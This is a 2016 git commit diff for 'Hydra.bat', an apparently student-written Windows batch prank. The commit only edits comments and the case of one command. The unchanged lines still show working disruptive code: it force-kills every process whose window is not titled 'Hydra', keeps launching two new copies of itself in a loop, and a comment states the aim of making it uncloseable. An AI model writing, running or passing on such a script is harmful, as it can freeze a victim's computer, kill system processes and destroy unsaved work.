3e8e64773f40155f451b6a02cd8d0342208f1dc7
zacharyacutey <zacharyacutey@users.noreply.github.com>
2016-02-11 12:22:13 -0500

    Update Hydra.bat

--- Hydra.bat
+++ Hydra.bat
@@ -1,9 +1,7 @@
 @ECHO OFF
-::What if we use a text document to keep track of how many have opened, so all programs know how many to test for.
-::Lets try the text document first. What if it created a new text document every time instead of editing the same one. 
+::Lets just pay attention in class, and do this on our free time, NOT SCHOOL (except lunch)
 TITLE Hydra
 SET n=1
-::What do you mean, it is above the loop? ;)
 :loop
 ::Lets make this uncloseable by all other programs. 
 FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
@@ -14,6 +12,6 @@ TASKKILL /F /FI "WINDOWTITLE ne Hydra"
 IF "%windowcount%"=="%n%" (
 START Hydra.bat
 START Hydra.bat
-SET /a n+=1
+set /a n+=1
 )
 GOTO :loop
